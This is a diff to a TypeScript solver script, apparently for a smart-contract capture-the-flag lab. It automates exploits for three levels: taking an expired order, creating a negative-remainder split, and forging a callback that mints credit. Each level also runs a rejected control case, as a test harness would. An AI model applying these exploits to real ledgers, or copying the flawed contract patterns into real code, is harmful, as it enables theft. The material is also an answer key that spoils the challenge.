@@ -49,5 +49,57 @@ if (!pos) {
 await run('l1-settle', [{ ExerciseCommand: { templateId: P1, contractId: pos.contractId, choice: 'Settle', choiceArgument: { marketCid: beta.contractId } } }]);
 const v1 = await post('/api/levels/1/verify', { party: player });
 console.log('  verified:', v1.verified, '→', v1.flag?.payload?.flagValue ?? v1.message);
-if (!v0.verified || !v1.verified) process.exit(1);
-console.log('\n\x1b[32m✔ both flags captured\x1b[0m');
+// ---- Levels 2-4: control first (must not win), then the exploit ----
+const exercise = (id: string, c0: { templateId: string; contractId: string }, choice: string, choiceArgument: unknown) =>
+  run(id, [{ ExerciseCommand: { templateId: c0.templateId, contractId: c0.contractId, choice, choiceArgument } }]);
+const boot = async (n: number) => (await post(`/api/levels/${n}/bootstrap`, { party: player })).contracts as any[];
+const verify = (n: number) => post(`/api/levels/${n}/verify`, { party: player });
+const ofTemplate = (cs: any[], ent: string) => cs.filter((x) => x.templateId.endsWith(`:${ent}`));
+
+step('LEVEL 2 — Stale Order (Take never checks expiresAt)');
+let orders = ofTemplate(await boot(2), 'Order');
+const live = orders.find((o) => o.payload.label === 'LIVE-105');
+await exercise('l2-take-live', live, 'Take', {});
+const v2c = await verify(2);
+console.log('  control (live order) verified:', v2c.verified, '→', v2c.proof?.payload?.proof);
+orders = ofTemplate(await boot(2), 'Order');
+const stale = orders.find((o) => o.payload.label === 'STALE-80');
+await exercise('l2-take-stale', stale, 'Take', {});
+const v2 = await verify(2);
+console.log('  exploit (expired order) verified:', v2.verified, '→', v2.flag?.payload?.value ?? v2.message);
+
+step('LEVEL 3 — Negative Remainder (Split has no positive-amount check)');
+let l3 = await boot(3);
+const vault = ofTemplate(l3, 'PrizeVault')[0];
+const holding = ofTemplate(l3, 'Holding')[0];
+await exercise('l3-buy-honest', vault, 'Buy', { holdingCid: holding.contractId });
+const v3c = await verify(3);
+console.log('  control (100.0 holding) verified:', v3c.verified, '→', v3c.proof?.payload?.proof);
+await exercise('l3-split', holding, 'Split', { splitAmount: '250.0' });
+l3 = await boot(3);
+const amounts = ofTemplate(l3, 'Holding').map((h) => h.payload.amount);
+console.log('  holdings after split:', amounts.join(', '));
+const big = ofTemplate(l3, 'Holding').find((h) => Number(h.payload.amount) >= 250);
+await exercise('l3-buy', vault, 'Buy', { holdingCid: big.contractId });
+const v3 = await verify(3);
+console.log('  exploit (250.0 holding) verified:', v3.verified, '→', v3.flag?.payload?.value ?? v3.message);
+
+step('LEVEL 4 — Forged Callback (Deliver runs any callback with the curator’s authority)');
+const gateway = ofTemplate(await boot(4), 'Gateway')[0];
+const message = (callback: unknown) => ({ message: { source: 'ethereum', payload: 'transfer 10 to bob', callback } });
+await exercise('l4-receipt', gateway, 'Deliver', message({ tag: 'LogReceipt', value: {} }));
+const v4c = await verify(4);
+console.log('  control (LogReceipt) verified:', v4c.verified, '→', v4c.proof?.payload?.proof);
+await exercise('l4-mint', gateway, 'Deliver', message({ tag: 'MintCredit', value: '1000.0' }));
+const v4 = await verify(4);
+console.log('  exploit (MintCredit) verified:', v4.verified, '→', v4.flag?.payload?.value ?? v4.message);
+const credits = ofTemplate(await boot(4), 'Credit').map((x) => `${x.payload.amount} signed by ${x.payload.curator.slice(0, 16)}…`);
+console.log('  credits held by the relayer:', credits.join('; '));
+
+const controlsHeld = !v2c.verified && !v3c.verified && !v4c.verified;
+const allSolved = v0.verified && v1.verified && v2.verified && v3.verified && v4.verified;
+if (!controlsHeld || !allSolved) {
+  console.log('\n\x1b[31m✘ controls held:', controlsHeld, '· all solved:', allSolved, '\x1b[0m');
+  process.exit(1);
+}
+console.log('\n\x1b[32m✔ all five flags captured; every control case was rejected\x1b[0m');
